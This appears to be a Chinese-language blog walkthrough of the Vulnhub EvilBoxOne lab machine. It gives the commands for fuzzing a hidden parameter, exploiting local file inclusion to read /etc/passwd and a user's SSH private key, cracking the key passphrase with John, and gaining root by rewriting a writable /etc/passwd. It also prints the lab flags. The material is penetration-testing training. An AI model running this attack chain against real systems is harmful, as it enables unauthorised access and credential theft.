6 Vulnhub EvilBoxOne Writeup

hdfzzf
2022-04-07 (Updated: 2022-05-08)
内网渗透
PHP伪协议, SSH公钥登录, vulnhub, 参数爆破, 综合

该靶机难度介于简单和中等之间。不过还是能够学到很多知识。

靶机信息

靶机地址：evilbox_one

难度：Easy/Medium (Intermediate)

目标：取得root权限 + 2 Flag

涉及攻击方法：

  • 主机发现
  • 端口扫描
  • 强制访问（路径爆破）
  • 参数爆破
  • 文件包含
  • PHP封装器（伪协议）
  • 任意文件读取
  • SSH公钥登录
  • 离线密码破解
  • 系统权限漏洞利用

渗透

攻击机kali：10.0.2.4

主机发现

fping -gaq 10.0.2.0/24

-a: 显示可ping通的目标
-g: 生成目标列表(不能与 -f 同时使用)，可指定目标的开始和结束IP， 或者提供ip的子网掩码
-q: 安静模式(不显示每个目标或每个ping的结果)

靶机的IP为：10.0.2.9

端口扫描

sudo nmap -p- 10.0.2.9

靶机打开了两个端口：22和80

端口服务发现

sudo nmap -p22,80 -A 10.0.2.9

-A 等价于 -sV -sC -O 的组合

  • 22端口的服务为ssh，这里其实可以尝试爆破
  • 80端口的服务为http，CMS是Apache2，版本为2.4.38
  • 靶机操作系统为Debian
  • 系统内核版本为 4.x或者5.x，该工具猜测为4.15-5.6
  • 其他信息

访问http服务

访问10.0.2.9:80发现是apache2的一个界面，没有其他信息了。此时看一下源码和抓包，发现都没有信息，因此直接进行路径爆破。 

gobuster dir -u http://10.0.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp

发现了一个新的目录/secret，直接访问发现什么都没有，包括源码也是什么都没有。此时针对这个刚发现的目录再次进行路径爆破。 

gobuster dir -u http://10.0.2.9/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp

发现了在该目录下还存在着两个文件。把每一个都访问一下。发现两个文件的内容都为空。此时，有可能是该网页只有传入参数才能够显示一些内容，但是我们并不知道有哪些参数，并且参数的值应该为什么也不知道。这时候就可以利用参数爆破。

参数爆破

参数爆破时，参数值一般有两种情况：

  1. 数字、字母这些常见的值以及容易引起SQL注入的字符（如单引号）等；
  2. 网页上可能存在文件包含（如果没有传入文件名，很有可能内容为空），此时就需要将网站已经存在的文件名作为参数值

先尝试第一种情况： 

ffuf -w [参数字典]:PARAM -w [参数值字典]:VAL -u http://10.0.2.9/secret/evil.php?PARAM=VAL -fs 0

-fs 过滤。 -fs 0 表示如果页面返回的内容为空则过滤（不显示）

发现没有任何结果。那么接下来尝试第二种情况： 

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.0.2.9/secret/evil.php?FUZZ=../index.html -fs 0

如果只有一个参数，可以用上面，FUZZ会自动使用字典来代替

（这里因为secret目录下的index.html内容为空，所以使用网站目录下的index.html）

此时爆出一个参数名 command。我们用浏览器验证一下。

发现确实存在，这像是文件包含漏洞，如果我们包含evil.php发现结果和直接访问是一样的。输入如下payload验证一下是否存在该漏洞： 

http://10.0.2.9/secret/evil.php?command=../../../../../etc/passwd

（Linux中 cd .. 是返回上一级目录，如果cd ../../../../../返回五次上级目录，如果不够5次，那就返回到根目录则停止。）

发现确实存在文件包含漏洞。

文件包含漏洞利用

文件包含漏洞的利用一般有以下几种：

  1. 如果存在远程文件包含，则可以在自己的主机写一句话，然后让靶机包含该文件；
  2. 如果不存在远程文件包含，利用伪协议往靶机写入一句话；
  3. 如果前两者都不行，那么就利用伪协议进行信息收集；

远程文件包含

先验证是否存在远程文件包含，随便在kali上写一个文件： 

hello world!

然后开启http服务（先用浏览器访问一下是否成功开启）： 

sudo systemctl start apache2

最后，在url包含kali上的该文件，如果显示的内容与上图相同则说明存在远程包含。很可惜，结果是空，也就是不存在该漏洞。

伪协议写文件

php://filter默认是read，但是可以write！利用这个可以写一句话。但是可能没有写入的权限。

php://filter/write=convert.base64-decode/resource=test.php&txt=aGVsbG8gd29ybGQ=

hello world经过base64编码：aGVsbG8gd29ybGQ=

访问之后发现页面还是空白，并不知道是否成功写入（默认写在当前目录）。直接访问该文件验证一下。

发现并没有写入成功，因此证明没有写文件的权限。

伪协议信息收集

可以先读取evil.php的内容。 

php://filter/read=convert.base64-encode/resource=evil.php

将得到的结果base64解码后得到： 

<?php
    $filename = $_GET['command'];
    include($filename);
?>

这也说明了该文件确实存在文件包含漏洞。

边界突破（GET SHELL）

SSH爆破

从之前的信息收集发现有两个账号： 

root:x:0:0:root:/root:/bin/bash
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash

因此尝试对这两个账号进行密码爆破。 

hydra -l user.txt -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://10.0.2.9

发现并没有成功，当然也可能是我的字典太小了。因此尝试其他办法。

SSH私钥泄露（SSH公钥登录）

本来思路已经断了，就去搜索了一下，发现SSH除了密码登陆之外还可能存在着公钥登录，不过需要知道私钥，不过可以利用文件包含漏洞来读取私钥。

第一步，先判断以下靶机是否支持SSH公钥登录

ssh mowree@10.0.2.9 -v

注意箭头指向的那句话，说明mowree存在公钥登录。（虽然root也存在，但是私钥和公钥文件一般保存在用户家目录，而我们肯定没有权限读取root目录下的文件，否则也不用get shell）

第二步，读取公钥和私钥的信息

如果支持公钥登录的话，那么该用户的家目录应该包含相关的信息，比如默认位置 公钥：/home/username/.ssh/authorized_keys（可以看到加密算法） 私钥：/home/username/.ssh/id_rsa（如果加密算法为rsa的话）

第三步，利用私钥登录

将私钥写入到一个文件，然后执行下面命令 

ssh mowree@10.0.2.9 -i id_rsa # 文件名可以任意

提示：

不论将私钥所在的文件名是什么，一定要将权限设置为600，否则会报错，提示权限不够。（一般公、私钥的文件配置都是600）就像下图一样：

chmod 600 id_rsa

使用私钥登录发现还需要输入一个passphrase。

公私钥对生成的时候，有时候会给私钥加一个密码，要想利用公钥登录方式的话，就必须输入加密私钥的密码。 可以使用密码爆破。有hashcat， john等工具

先将 id_rsa 进行格式转换为john能够识别的（目录在/usr/share/john）： 

./ssh2john.py /home/hdfzzf/id_rsa > /home/hdfzzf/hash

然后进行破解（最好找一个大一点的字典，建议/usr/share/wordlists/rockyou.txt.gz）： 

john hash --wordlist=rockyou.txt # 将字典和hash放到同一目录

爆破结果：unicorn

再次利用SSH公钥登录 

1. ssh mowree@10.0.2.9 -i id_rsa
2. 输入密码：unicorn

成功get shell！

权限提升

Linux本题提权可以使用：内核漏洞、SUID、SUDO配置、crontab任务。其中查找SUID/SGID文件可以用下面的命令： 

find / -perm /4000 2>/dev/null # 4000代表suid权限，2000代表SGID；后面的表示不显示报错信息

要查找第三方编写的程序是否具有SUID/SGID。经查找发现并没有可用的。

这里介绍一个新的提权思路：查找靶机上当前用户拥有写权限且拥有者为root的文件，然后改写文件内容实现提权（比如写入nc反弹shell的命令）。

利用下述命令寻找拥有写权限的文件。 

find / -writable 2>/dev/null | grep -v proc|grep -v run|grep -v sys

查找拥有写权限的文件。过滤proc目录，该目录的文件是系统运行过程中动态生成的。一般run，sys目录也不用看

2: 表示标准错误
'>': 重定向
/dev/null: 是空设备，它接受您想要的任何输入并将其丢弃。它可以用来抑制任何输出。

此时注意到这么一个文件：/etc/passwd

这个文件存储的靶机上所有用户的信息，一般用户只有读权限，而没有写权限。而这台靶机上却拥有写权限，这是一个极大的漏洞！

小知识：/etc/passwd里面的第二个字段是密码字段，一般都只有一个x，表示密码已加密保存在/etc/shadow（这文件普通用户连读权限都没有）。但是，优先级是/etc/passwd优先，也就是如果/etc/passwd里面密码字段保存了密码，那么/etc/shadow中的密码就会失效！

接下来的思路很明确了，修改/etc/passwd中root的密码字段，然后直接用su -命令切换。（也可以直接添加一条记录echo "root2:加密密码:0:0:root:/root:/bin/bash"，因为用户名不是最重要的，重要的是uid，uid为0即使用户名不是root，也拥 有root权限。）

生成密码的加密密文： 

openssl passwd -1 root # -1 某种加密算法

明文：root
密文：$1$yKHIKZSK$R26qtrasBuYAfoQJvngpU0

（这里操作需要注意：需要在正常模式下删除和粘贴密码，插入模式下上下左右删都会被解析为字符）

然后 

su - 或者 su root # 登录root

成功登录。

第一个flag在/home/mowree/user.txt，第二个flag在/root/root.txt。

user.txt: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
root.txt: 36QtXfdJWvdC0VavlPIApUbDlqTsBM

到此，本台靶机的渗透结束。

验证操作

发现即使改了root的密码，也无法直接用ssh直接登录root，原因是权限不够。

但是，如果改了mowree的密码，则可以直接使用ssh的密码登录。

总结

对该靶机的练习，学到了许多东西。

在web方面，除了之前的路径爆破之外，还了解到了参数爆破。已经文件包含漏洞的利用。在权限提升和反弹shell上，学到了SSH爆破和SSH公钥登录，还有这其中使用的一些小工具。

还有一些Linux的小知识，比如可以多返回几次上一级目录，以及find命令的基本使用等。
